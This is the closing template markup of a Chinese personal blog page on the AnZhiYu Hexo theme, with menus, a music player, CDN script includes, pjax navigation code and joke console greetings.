0.88rem;">windows<sup>1</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 0.88rem;">工具<sup>1</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 0.88rem;">漏洞<sup>8</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">网络基础<sup>20</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.cbd.int/pangu@4.0.7/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (true){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("12/01/2024 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2024 By 安知鱼 V1.6.14",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 蜡笔小王 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>